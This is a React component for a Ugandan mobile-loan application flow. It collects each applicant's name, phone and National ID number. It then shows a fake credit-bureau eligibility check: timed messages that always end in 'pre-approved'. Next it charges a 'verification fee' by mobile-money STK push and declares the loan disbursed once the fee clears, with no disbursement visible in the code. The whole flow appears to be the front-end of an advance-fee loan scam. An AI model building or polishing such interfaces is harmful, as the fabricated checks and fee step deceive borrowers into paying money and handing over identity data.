import React, { useState, useEffect } from 'react';
import { LoanPackage, RepaymentMonth, LoanApplication } from '../types';
import {
  FIXED_FEE_UGX,
  calcRepayment,
  formatUGX,
  formatUgandaPhoneNumber,
  detectUgandaNetwork,
  generateRandomRef,
} from '../data/packages';
import {
  X,
  User,
  Phone,
  CreditCard,
  Info,
  CheckCircle2,
  Clock,
  ArrowRight,
  ShieldCheck,
  Smartphone,
  Copy,
  Printer,
  Check,
  AlertCircle,
  HelpCircle,
  Lock,
  RotateCcw,
  Zap,
} from 'lucide-react';

interface ApplicationModalProps {
  packageData: LoanPackage | null;
  isOpen: boolean;
  onClose: () => void;
  onLoanApproved: (loan: LoanApplication) => void;
}

type ModalStep =
  | 'details'
  | 'checking'
  | 'qualified'
  | 'disbursement_phone'
  | 'send_stk'
  | 'verifying'
  | 'success'
  | 'failed';

export const ApplicationModal: React.FC<ApplicationModalProps> = ({
  packageData,
  isOpen,
  onClose,
  onLoanApproved,
}) => {
  if (!isOpen || !packageData) return null;

  // Form states
  const [step, setStep] = useState<ModalStep>('details');
  const [fullName, setFullName] = useState('');
  const [phone, setPhone] = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [disbursementPhone, setDisbursementPhone] = useState('');
  const [selectedMonths, setSelectedMonths] = useState<RepaymentMonth>(3);
  const [statusError, setStatusError] = useState<string>('');

  // Eligibility check progress
  const [checkProgressText, setCheckProgressText] = useState('Verifying national identity details...');

  // Server-side STK Push verification state
  const [stkCountdown, setStkCountdown] = useState(45);
  const [isInitiatingSTK, setIsInitiatingSTK] = useState(false);
  const [failureReason, setFailureReason] = useState('');
  const [gatewayTx, setGatewayTx] = useState<{
    transaction_id?: number | string;
    checkout_request_id?: string;
    merchant_request_id?: string;
    reference?: string;
    mode?: 'live' | 'sandbox';
    message?: string;
  } | null>(null);

  // Confirmed loan output
  const [confirmedLoan, setConfirmedLoan] = useState<LoanApplication | null>(null);
  const [copiedRef, setCopiedRef] = useState(false);

  const principal = packageData.limitUgx;
  const currentPlan = calcRepayment(principal, selectedMonths);

  // ESC key listener
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape' && step !== 'verifying') {
        onClose();
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [onClose, step]);

  // Reset when re-opened
  useEffect(() => {
    if (isOpen) {
      setStep('details');
      setStatusError('');
      setFailureReason('');
      setConfirmedLoan(null);
    }
  }, [isOpen, packageData.id]);

  // Eligibility checking simulation
  useEffect(() => {
    if (step === 'checking') {
      const t1 = setTimeout(() => {
        setCheckProgressText('Checking Credit Reference Bureau (CRB) Uganda...');
      }, 1400);

      const t2 = setTimeout(() => {
        setCheckProgressText('Verifying Mobile Money credit score & active SIM...');
      }, 3000);

      const t3 = setTimeout(() => {
        setStep('qualified');
      }, 4500);

      return () => {
        clearTimeout(t1);
        clearTimeout(t2);
        clearTimeout(t3);
      };
    }
  }, [step]);

  // Server-Side Verification Countdown
  useEffect(() => {
    if (step === 'verifying' && stkCountdown > 0) {
      const timer = setInterval(() => {
        setStkCountdown((c) => {
          if (c <= 1) {
            clearInterval(timer);
            // Timed out on server-side without confirmation
            setFailureReason('The request timed out. No Mobile Money PIN was entered on your phone handset before the session expired.');
            setStep('failed');
            return 0;
          }
          return c - 1;
        });
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [step, stkCountdown]);

  // Validation handlers
  const handleProceedToEligibility = (e: React.FormEvent) => {
    e.preventDefault();
    setStatusError('');

    if (!fullName.trim() || fullName.trim().length < 3) {
      setStatusError('Please enter your full official name as on your National ID.');
      return;
    }

    const cleanPhone = phone.replace(/[^0-9]/g, '');
    if (cleanPhone.length < 9) {
      setStatusError('Please enter a valid Ugandan phone number (e.g. 0772123456).');
      return;
    }

    if (!idNumber.trim() || idNumber.trim().length < 5) {
      setStatusError('Please enter your Ugandan National ID Number (NIN).');
      return;
    }

    if (!disbursementPhone) {
      setDisbursementPhone(phone);
    }

    setStep('checking');
  };

  const handleAgreeAndContinue = () => {
    setStatusError('');
    if (!disbursementPhone) {
      setDisbursementPhone(phone);
    }
    setStep('disbursement_phone');
  };

  const handleProceedToSendSTK = (e: React.FormEvent) => {
    e.preventDefault();
    setStatusError('');
    const cleanDisburse = (disbursementPhone || phone).replace(/[^0-9]/g, '');
    if (cleanDisburse.length < 9) {
      setStatusError('Please enter a valid phone number to receive the loan funds.');
      return;
    }
    setStep('send_stk');
  };

  // Dispatch STK Push to User Handset & Start Server-Side Polling
  const handleSendSTKPush = async () => {
    setIsInitiatingSTK(true);
    setStatusError('');
    setFailureReason('');
    const targetPhone = disbursementPhone.trim() || phone.trim();
    const tempRef = generateRandomRef();

    try {
      const res = await fetch('/api/stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone: targetPhone,
          amount: packageData.feeUgx,
          reference: tempRef,
        }),
      });

      const data = await res.json();
      setIsInitiatingSTK(false);

      if (data.success && data.data) {
        setGatewayTx({
          transaction_id: data.data.transaction_id,
          checkout_request_id: data.data.checkout_request_id,
          merchant_request_id: data.data.merchant_request_id,
          reference: data.data.reference || tempRef,
          mode: data.mode || 'sandbox',
          message: data.message,
        });

        setStkCountdown(45);
        setStep('verifying');

        // Initiate server-side verification polling with the OptimaPay Global reference
        startServerVerificationPolling(data.data.reference || data.data.transaction_id, data.data.reference || tempRef);
      } else {
        setStatusError(data.message || 'Failed to dispatch STK push to mobile phone.');
      }
    } catch (err: any) {
      setIsInitiatingSTK(false);
      setStatusError('Unable to connect to mobile payment server. Please check your network and try again.');
    }
  };

  // Pure Server-Side Verification: Checks server until completed, failed, or timed out
  const startServerVerificationPolling = (txId: string | number, ref: string) => {
    let attempts = 0;
    const maxAttempts = 18; // ~45 seconds
    const interval = setInterval(async () => {
      attempts++;
      if (attempts > maxAttempts) {
        clearInterval(interval);
        return;
      }

      try {
        const resp = await fetch(`/api/stk-push/status/${txId}`);
        const result = await resp.json();

        if (result.success) {
          const status = result.data?.status;
          const resultCode = result.data?.result_code;

          // Server verified payment completed & credited
          if (status === 'completed' || resultCode === 0) {
            clearInterval(interval);
            completeLoanApproval(ref, result.data?.mpesa_receipt_number);
          } else if (status === 'failed' || resultCode === 1032 || resultCode === 1037) {
            clearInterval(interval);
            setFailureReason(result.data?.result_desc || 'Payment was cancelled or rejected on the phone handset.');
            setStep('failed');
          }
        }
      } catch {
        // Network poll glitch, continue next cycle
      }
    }, 2500);
  };

  const completeLoanApproval = (ref: string, receiptNo?: string) => {
    const network = detectUgandaNetwork(disbursementPhone || phone);
    const plan = calcRepayment(principal, selectedMonths);

    const due = new Date();
    due.setDate(due.getDate() + selectedMonths * 30);

    const approvedLoan: LoanApplication = {
      id: `loan-${Date.now()}`,
      reference: ref,
      fullName: fullName.trim(),
      phone: phone.trim(),
      disbursementPhone: disbursementPhone.trim() || phone.trim(),
      network,
      idNumber: idNumber.trim().toUpperCase(),
      principal,
      limitDisplay: packageData.limitDisplay,
      fee: FIXED_FEE_UGX,
      months: selectedMonths,
      totalRepayment: plan.total,
      monthlyRepayment: plan.monthly,
      status: 'disbursed',
      createdAt: new Date().toISOString(),
      dueDate: due.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' }),
      disbursementTxId: receiptNo || `UGX-${gatewayTx?.transaction_id || Math.floor(10000000 + Math.random() * 90000000)}`,
    };

    setConfirmedLoan(approvedLoan);
    onLoanApproved(approvedLoan);
    setStep('success');
  };

  const copyRefToClipboard = () => {
    if (confirmedLoan?.reference) {
      navigator.clipboard.writeText(confirmedLoan.reference);
      setCopiedRef(true);
      setTimeout(() => setCopiedRef(false), 2000);
    }
  };

  const targetMobile = disbursementPhone || phone;
  const networkName = detectUgandaNetwork(targetMobile);

  return (
    <div className="fixed inset-0 z-50 bg-[#0a2540]/80 backdrop-blur-md flex items-center justify-center p-3 sm:p-4 overflow-y-auto">
      <div className="bg-white max-w-[520px] w-full rounded-[28px] sm:rounded-[38px] p-5 sm:p-7 shadow-[0_40px_60px_rgba(10,37,64,0.4)] border border-[#0a2540]/10 relative max-h-[92vh] overflow-y-auto">
        {/* Close Button (disabled while actively waiting for phone PIN) */}
        {step !== 'verifying' && (
          <button
            type="button"
            onClick={onClose}
            className="sticky top-0 float-right text-slate-400 hover:text-[#0e1f3f] hover:bg-slate-100 w-8 h-8 rounded-full flex items-center justify-center transition-all z-10 -mr-1 -mt-1"
            aria-label="Close modal"
          >
            <X className="w-5 h-5" />
          </button>
        )}

        {/* ================= STEP 1: PERSONAL DETAILS ================= */}
        {step === 'details' && (
          <div className="animate-fade-up">
            <h2 className="text-xl sm:text-2xl font-extrabold text-[#0e1f3f] mb-1 pr-6 leading-tight">
              Apply for <span className="text-[#0a2540]">UGX {packageData.limitDisplay}</span>
            </h2>
            <div className="bg-[#f8fafc] rounded-2xl p-3 sm:p-3.5 my-3 flex items-center justify-between border border-slate-100">
              <span className="font-bold text-[#0e1f3f] text-xs sm:text-sm">
                Loan: UGX {packageData.limitDisplay}
              </span>
              <span className="font-bold text-[#0a2540] text-xs sm:text-sm bg-[#eef2f6] px-3 py-1 rounded-full">
                Fee: UGX {packageData.feeUgx.toLocaleString()}
              </span>
            </div>

            <form onSubmit={handleProceedToEligibility} className="space-y-3 mt-3">
              <div>
                <label className="block text-xs font-bold text-[#0e1f3f] mb-1">
                  <span className="inline-flex items-center gap-1.5">
                    <User className="w-3.5 h-3.5 text-[#0a2540]" />
                    Full Official Name
                  </span>
                </label>
                <input
                  type="text"
                  required
                  placeholder="e.g. John Okello"
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  className="w-full bg-[#f8fafc] border border-slate-200 rounded-xl px-3.5 py-2.5 text-sm text-[#0e1f3f] focus:outline-none focus:border-[#f5b342] focus:bg-white transition-colors"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-[#0e1f3f] mb-1">
                  <span className="inline-flex items-center gap-1.5">
                    <Phone className="w-3.5 h-3.5 text-[#0a2540]" />
                    Registered Mobile Phone Number
                  </span>
                </label>
                <div className="relative">
                  <input
                    type="tel"
                    required
                    placeholder="0772 123 456"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/[^0-9\s]/g, ''))}
                    className="w-full bg-[#f8fafc] border border-slate-200 rounded-xl px-3.5 py-2.5 text-sm text-[#0e1f3f] focus:outline-none focus:border-[#f5b342] focus:bg-white transition-colors pl-12"
                  />
                  <span className="absolute left-3.5 top-2.5 text-xs text-slate-400 font-mono font-bold">
                    +256
                  </span>
                </div>
                {phone && (
                  <p className="text-[11px] text-slate-500 mt-1 flex items-center gap-1">
                    <span>Detected Network:</span>
                    <strong className="text-[#0a2540]">{detectUgandaNetwork(phone)} Uganda</strong>
                  </p>
                )}
              </div>

              <div>
                <label className="block text-xs font-bold text-[#0e1f3f] mb-1">
                  <span className="inline-flex items-center gap-1.5">
                    <CreditCard className="w-3.5 h-3.5 text-[#0a2540]" />
                    National ID Number (NIN)
                  </span>
                </label>
                <input
                  type="text"
                  required
                  placeholder="e.g. CM92038102XXXX"
                  value={idNumber}
                  onChange={(e) => setIdNumber(e.target.value.toUpperCase())}
                  className="w-full bg-[#f8fafc] border border-slate-200 rounded-xl px-3.5 py-2.5 text-sm font-mono text-[#0e1f3f] focus:outline-none focus:border-[#f5b342] focus:bg-white transition-colors uppercase"
                />
              </div>

              {statusError && (
                <div className="p-2.5 bg-rose-50 border border-rose-200 rounded-xl text-xs text-rose-700 flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0 text-rose-500" />
                  <span>{statusError}</span>
                </div>
              )}

              <button
                type="submit"
                className="w-full bg-[#0a2540] hover:bg-[#07192c] text-white font-bold py-3 px-6 rounded-full text-sm cursor-pointer shadow-md transition-all flex items-center justify-center gap-2 mt-4 active:scale-98"
              >
                <span>Check Instant Eligibility</span>
                <ArrowRight className="w-4 h-4 text-[#f5b342]" />
              </button>
            </form>
          </div>
        )}

        {/* ================= STEP 2: ELIGIBILITY CHECKING ================= */}
        {step === 'checking' && (
          <div className="py-8 text-center animate-fade-up">
            <div className="relative w-20 h-20 mx-auto mb-5 flex items-center justify-center">
              <div className="absolute inset-0 rounded-full border-4 border-slate-100"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#f5b342] border-t-transparent animate-spin"></div>
              <ShieldCheck className="w-9 h-9 text-[#0a2540] animate-pulse" />
            </div>

            <h3 className="font-extrabold text-xl text-[#0e1f3f] mb-1">
              Verifying Eligibility
            </h3>
            <p className="text-xs text-[#64748b] mb-4">
              Connecting with credit reporting servers in Uganda...
            </p>

            <div className="bg-[#f8fafc] border border-slate-200 rounded-2xl p-4 max-w-sm mx-auto text-left space-y-2">
              <div className="flex items-center gap-2 text-xs font-medium text-[#0a2540]">
                <div className="w-2 h-2 rounded-full bg-[#27ae60] animate-ping"></div>
                <span>{checkProgressText}</span>
              </div>
              <div className="w-full bg-slate-200 h-1.5 rounded-full overflow-hidden">
                <div className="bg-[#27ae60] h-full w-3/4 rounded-full animate-pulse"></div>
              </div>
            </div>
          </div>
        )}

        {/* ================= STEP 3: QUALIFIED OFFER ================= */}
        {step === 'qualified' && (
          <div className="animate-fade-up">
            <div className="w-12 h-12 bg-[#eaf6ed] text-[#27ae60] rounded-full flex items-center justify-center mx-auto mb-2">
              <CheckCircle2 className="w-7 h-7" />
            </div>

            <h2 className="text-xl sm:text-2xl font-extrabold text-[#0e1f3f] mb-1 text-center">
              Congratulations, {fullName.split(' ')[0]}!
            </h2>
            <p className="text-xs text-[#64748b] text-center mb-4">
              You are pre-approved for <strong className="text-[#0a2540]">UGX {packageData.limitDisplay}</strong>.
            </p>

            <div className="bg-[#f8fafc] rounded-2xl p-4 border border-slate-200 mb-4">
              <label className="block text-xs font-bold text-[#0e1f3f] mb-2">
                Select Your Repayment Duration:
              </label>
              <div className="grid grid-cols-4 gap-2">
                {([3, 6, 9, 12] as RepaymentMonth[]).map((m) => (
                  <button
                    key={m}
                    type="button"
                    onClick={() => setSelectedMonths(m)}
                    className={`py-2.5 px-2 rounded-xl text-xs font-bold transition-all border ${
                      selectedMonths === m
                        ? 'bg-[#0a2540] text-white border-[#0a2540] shadow-sm'
                        : 'bg-white text-slate-700 border-slate-200 hover:bg-slate-50'
                    }`}
                  >
                    <div>{m} Mos</div>
                    <div className="text-[10px] opacity-80 mt-0.5">8.5% p.a.</div>
                  </button>
                ))}
              </div>

              <div className="mt-4 pt-3 border-t border-slate-200 space-y-1.5 text-xs">
                <div className="flex justify-between">
                  <span className="text-[#64748b]">Monthly Installment:</span>
                  <span className="font-extrabold text-[#0e1f3f]">
                    UGX {currentPlan.monthly.toLocaleString()} / mo
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-[#64748b]">Total Repayment:</span>
                  <span className="font-bold text-[#0a2540]">
                    UGX {currentPlan.total.toLocaleString()}
                  </span>
                </div>
              </div>
            </div>

            <button
              type="button"
              onClick={handleAgreeAndContinue}
              className="w-full bg-[#0a2540] hover:bg-[#07192c] text-white font-bold py-3 px-6 rounded-full text-sm cursor-pointer shadow-md transition-all flex items-center justify-center gap-2 active:scale-98"
            >
              <span>Accept Offer &amp; Continue</span>
              <ArrowRight className="w-4 h-4 text-[#f5b342]" />
            </button>
          </div>
        )}

        {/* ================= STEP 4: DISBURSEMENT PHONE NUMBER ================= */}
        {step === 'disbursement_phone' && (
          <div className="animate-fade-up">
            <h2 className="text-xl sm:text-2xl font-extrabold text-[#0e1f3f] mb-1">
              Disbursement Mobile Account
            </h2>
            <p className="text-xs text-[#64748b] mb-4">
              Enter the MTN or Airtel Mobile Money number that will receive the loan funds.
            </p>

            <form onSubmit={handleProceedToSendSTK} className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-[#0e1f3f] mb-1">
                  <span className="inline-flex items-center gap-1.5">
                    <Smartphone className="w-3.5 h-3.5 text-[#0a2540]" />
                    Mobile Money Receiver Number
                  </span>
                </label>
                <div className="relative">
                  <input
                    type="tel"
                    required
                    placeholder="0772 123 456"
                    value={disbursementPhone}
                    onChange={(e) => setDisbursementPhone(e.target.value.replace(/[^0-9\s]/g, ''))}
                    className="w-full bg-[#f8fafc] border border-slate-200 rounded-xl px-3.5 py-2.5 text-sm text-[#0e1f3f] focus:outline-none focus:border-[#f5b342] focus:bg-white transition-colors pl-12"
                  />
                  <span className="absolute left-3.5 top-2.5 text-xs text-slate-400 font-mono font-bold">
                    +256
                  </span>
                </div>
                <div className="flex items-center justify-between text-[11px] text-slate-500 mt-1">
                  <span>Network: <strong className="text-[#0a2540]">{networkName} Uganda</strong></span>
                  <button
                    type="button"
                    onClick={() => setDisbursementPhone(phone)}
                    className="text-[#0a2540] hover:underline font-semibold"
                  >
                    Use application number
                  </button>
                </div>
              </div>

              {statusError && (
                <div className="p-2.5 bg-rose-50 border border-rose-200 rounded-xl text-xs text-rose-700 flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0 text-rose-500" />
                  <span>{statusError}</span>
                </div>
              )}

              <button
                type="submit"
                className="w-full bg-[#0a2540] hover:bg-[#07192c] text-white font-bold py-3 px-6 rounded-full text-sm cursor-pointer shadow-md transition-all flex items-center justify-center gap-2 active:scale-98"
              >
                <span>Review &amp; Authorize</span>
                <ArrowRight className="w-4 h-4 text-[#f5b342]" />
              </button>
            </form>
          </div>
        )}

        {/* ================= STEP 5: FINAL CARD FOR SENDING STK PUSH ================= */}
        {step === 'send_stk' && (
          <div className="animate-fade-up">
            <h2 className="text-xl sm:text-2xl font-extrabold text-[#0e1f3f] mb-1">
              Confirm &amp; Send STK Push
            </h2>
            <p className="text-xs text-[#64748b] mb-4">
              Review your loan details. The STK Push prompt will be sent directly to your phone.
            </p>

            {/* Loan Terms Summary */}
            <div className="bg-[#f8fafc] rounded-2xl p-4 border border-slate-200 space-y-2.5 text-xs mb-4">
              <div className="flex justify-between py-1 border-b border-slate-200/80">
                <span className="text-[#64748b]">Approved Loan Principal</span>
                <span className="font-extrabold text-sm text-[#0e1f3f]">UGX {packageData.limitDisplay}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-200/80">
                <span className="text-[#64748b]">One-Time Verification Fee</span>
                <span className="font-bold text-[#0a2540] bg-[#eef2f6] px-2.5 py-0.5 rounded-full">
                  UGX {packageData.feeUgx.toLocaleString()}
                </span>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-200/80">
                <span className="text-[#64748b]">Receiving Mobile Handset</span>
                <span className="font-mono font-bold text-[#0e1f3f]">{targetMobile} ({networkName})</span>
              </div>
              <div className="flex justify-between py-1">
                <span className="text-[#64748b]">Repayment Term</span>
                <span className="font-semibold text-slate-700">{selectedMonths} Months @ UGX {currentPlan.monthly.toLocaleString()}/mo</span>
              </div>
            </div>

            {/* How It Works Notice */}
            <div className="bg-sky-50 border border-sky-200 rounded-2xl p-3.5 mb-4 text-xs text-sky-950 flex items-start gap-2.5">
              <Smartphone className="w-4 h-4 text-sky-700 shrink-0 mt-0.5" />
              <div className="leading-relaxed">
                <span className="font-bold block text-sky-900 mb-0.5">Automated Phone Prompt</span>
                <span>
                  When you click the button below, a secure Mobile Money flash prompt pops up directly on your phone handset screen. Enter your PIN on your phone to complete authorization.
                </span>
              </div>
            </div>

            {statusError && (
              <div className="p-2.5 bg-rose-50 border border-rose-200 rounded-xl text-xs text-rose-700 flex items-center gap-2 mb-3">
                <AlertCircle className="w-4 h-4 shrink-0 text-rose-500" />
                <span>{statusError}</span>
              </div>
            )}

            <button
              type="button"
              disabled={isInitiatingSTK}
              onClick={handleSendSTKPush}
              className="w-full bg-gradient-to-r from-[#0a2540] via-[#12365a] to-[#1a3a6a] hover:from-[#07192c] hover:to-[#122e54] text-white font-bold py-3.5 px-6 rounded-full text-sm cursor-pointer shadow-[0_12px_24px_rgba(10,37,64,0.3)] transition-all transform active:scale-98 flex items-center justify-center gap-2.5 disabled:opacity-60"
            >
              {isInitiatingSTK ? (
                <>
                  <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                  <span>Dispatching STK to Phone...</span>
                </>
              ) : (
                <>
                  <span>Send STK Push to My Phone</span>
                  <ArrowRight className="w-4 h-4 text-[#f5b342]" />
                </>
              )}
            </button>

            <div className="flex items-center justify-center gap-2 pt-3 text-[11px] text-[#64748b]">
              <Lock className="w-3.5 h-3.5 text-emerald-600" />
              <span>Payments are encrypted and verified server-side</span>
            </div>
          </div>
        )}

        {/* ================= STEP 6: SERVER-SIDE VERIFICATION IN PROGRESS ================= */}
        {step === 'verifying' && (
          <div className="py-6 text-center animate-fade-up">
            {/* Animated Handset Radar Indicator */}
            <div className="relative w-24 h-24 mx-auto mb-5 flex items-center justify-center">
              <div className="absolute inset-0 rounded-full bg-emerald-100 animate-ping opacity-75"></div>
              <div className="absolute inset-2 rounded-full border-2 border-emerald-500/40 animate-pulse"></div>
              <div className="w-16 h-16 rounded-full bg-[#0a2540] text-[#f5b342] flex items-center justify-center shadow-lg relative z-10">
                <Smartphone className="w-8 h-8 animate-bounce" />
              </div>
            </div>

            <h2 className="text-xl sm:text-2xl font-extrabold text-[#0e1f3f] mb-1">
              STK Prompt Sent to Handset
            </h2>
            <p className="text-xs text-[#64748b] max-w-sm mx-auto mb-4">
              Check your phone screen now. Enter your Mobile Money PIN on your physical phone.
            </p>

            {/* Target details card */}
            <div className="bg-[#f8fafc] rounded-2xl p-4 border border-slate-200 text-xs max-w-sm mx-auto text-left space-y-2 mb-4">
              <div className="flex justify-between">
                <span className="text-slate-500">Target Phone</span>
                <span className="font-mono font-bold text-[#0e1f3f]">{targetMobile}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Network</span>
                <span className="font-bold text-slate-800">{networkName} Mobile Money</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Verification Fee</span>
                <span className="font-bold text-[#0a2540]">UGX {packageData.feeUgx.toLocaleString()}</span>
              </div>
            </div>

            {/* Live Server-Side Verification Badge */}
            <div className="bg-emerald-50 border border-emerald-200 rounded-xl py-2.5 px-4 inline-flex items-center gap-2.5 text-xs text-emerald-950 mb-3">
              <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse"></div>
              <span className="font-medium">
                Awaiting server-side payment confirmation ({stkCountdown}s)
              </span>
            </div>

            <p className="text-[11px] text-slate-400">
              Please do not close this window while the network confirms your transaction.
            </p>
          </div>
        )}

        {/* ================= STEP 7: SERVER-SIDE SUCCESS CARD ================= */}
        {step === 'success' && confirmedLoan && (
          <div className="animate-fade-up text-center py-2">
            <div className="w-16 h-16 bg-[#eaf6ed] text-[#27ae60] rounded-full flex items-center justify-center mx-auto mb-3 shadow-inner">
              <CheckCircle2 className="w-10 h-10" />
            </div>

            <h2 className="text-xl sm:text-2xl font-extrabold text-[#0e1f3f] mb-1">
              Fee Credited &amp; Loan Disbursed!
            </h2>
            <p className="text-xs text-[#64748b] mb-4">
              Your payment has been verified by the server. Funds are queued for direct credit.
            </p>

            {/* Server Confirmation Badge */}
            <div className="bg-[#f8fafc] border border-slate-200 rounded-2xl p-4 mb-4 text-xs space-y-2 text-left">
              <div className="flex items-center justify-between pb-2 border-b border-slate-200/80">
                <span className="text-slate-500">Transaction Status</span>
                <span className="font-bold text-emerald-700 bg-emerald-100 px-2.5 py-0.5 rounded-full text-[11px]">
                  Verified &amp; Credited
                </span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-slate-500">Server Receipt ID</span>
                <span className="font-mono font-bold text-[#0e1f3f]">{confirmedLoan.disbursementTxId}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-slate-500">Approved Loan Amount</span>
                <span className="font-extrabold text-sm text-[#0a2540]">UGX {confirmedLoan.limitDisplay}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-slate-500">Disbursed To</span>
                <span className="font-mono text-slate-800">{confirmedLoan.disbursementPhone}</span>
              </div>
              <div className="flex items-center justify-between pt-1 border-t border-slate-200/80">
                <span className="text-slate-500">First Repayment Due</span>
                <span className="font-bold text-slate-800">{confirmedLoan.dueDate}</span>
              </div>
            </div>

            <div className="flex gap-2">
              <button
                type="button"
                onClick={copyRefToClipboard}
                className="flex-1 bg-slate-100 hover:bg-slate-200 text-[#0a2540] font-semibold py-2.5 px-4 rounded-full text-xs transition-colors flex items-center justify-center gap-1.5"
              >
                {copiedRef ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copiedRef ? 'Copied Receipt' : 'Copy Reference'}</span>
              </button>
              <button
                type="button"
                onClick={onClose}
                className="flex-1 bg-[#0a2540] hover:bg-[#07192c] text-white font-bold py-2.5 px-4 rounded-full text-xs transition-colors"
              >
                Done
              </button>
            </div>
          </div>
        )}

        {/* ================= STEP 8: PAYMENT FAILED / TIMED OUT CARD ================= */}
        {step === 'failed' && (
          <div className="animate-fade-up text-center py-2">
            <div className="w-16 h-16 bg-rose-50 text-rose-600 rounded-full flex items-center justify-center mx-auto mb-3 shadow-inner">
              <AlertCircle className="w-10 h-10" />
            </div>

            <h2 className="text-xl sm:text-2xl font-extrabold text-[#0e1f3f] mb-1">
              Payment Authorization Failed
            </h2>
            <p className="text-xs text-[#64748b] mb-4">
              {failureReason || 'The payment session timed out or was cancelled on your phone handset.'}
            </p>

            <div className="bg-[#f8fafc] border border-slate-200 rounded-2xl p-4 mb-4 text-xs text-left space-y-2">
              <div className="flex justify-between">
                <span className="text-slate-500">Attempted Number</span>
                <span className="font-mono font-bold text-slate-800">{targetMobile}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Status</span>
                <span className="text-rose-600 font-bold">Unconfirmed / Timed Out</span>
              </div>
              <p className="text-[11px] text-slate-500 pt-1 border-t border-slate-200/80">
                Ensure your phone is unlocked with active mobile money PIN access before retrying.
              </p>
            </div>

            <div className="flex flex-col sm:flex-row gap-2">
              <button
                type="button"
                onClick={handleSendSTKPush}
                className="flex-1 bg-[#0a2540] hover:bg-[#07192c] text-white font-bold py-3 px-5 rounded-full text-xs transition-colors flex items-center justify-center gap-2"
              >
                <RotateCcw className="w-3.5 h-3.5 text-[#f5b342]" />
                <span>Resend STK Push</span>
              </button>
              <button
                type="button"
                onClick={() => setStep('disbursement_phone')}
                className="flex-1 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-3 px-5 rounded-full text-xs transition-colors"
              >
                Change Number
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
